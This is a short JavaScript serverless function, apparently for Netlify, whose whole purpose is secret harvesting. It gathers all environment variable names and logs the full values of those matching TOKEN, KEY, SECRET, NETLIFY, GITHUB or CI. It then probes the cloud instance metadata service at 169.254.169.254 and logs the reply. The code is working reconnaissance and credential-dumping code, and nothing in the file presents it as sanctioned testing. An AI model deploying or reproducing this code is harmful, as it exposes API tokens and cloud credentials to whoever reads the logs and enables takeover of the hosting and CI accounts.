exports.handler = async (event, context) => {
  const dump = {
    envKeys: Object.keys(process.env),
    hasNetlifyKey: !!process.env.NETLIFY_API_TOKEN,
    interestingEnv: Object.fromEntries(
      Object.entries(process.env).filter(([k]) => 
        k.includes('TOKEN') || k.includes('KEY') || k.includes('SECRET') || k.includes('NETLIFY') || k.includes('GITHUB') || k.includes('CI')
      )
    ),
    contextUser: context.clientContext?.user ? 'User present' : 'no user',
    runtime: process.version
  };

  console.log('Netlify Env Dump:', JSON.stringify(dump, null, 2));

  try {
    const res = await fetch('http://169.254.169.254/latest/meta-data/');
    console.log('IMDS Status:', res.status);
    const text = await res.text();
    console.log('IMDS Snippet:', text.substring(0, 200));
  } catch (e) {
    console.log('IMDS Error:', e.message);
  }

  return {
    statusCode: 200,
    body: JSON.stringify({ message: 'Dump logged!' })
  };
};
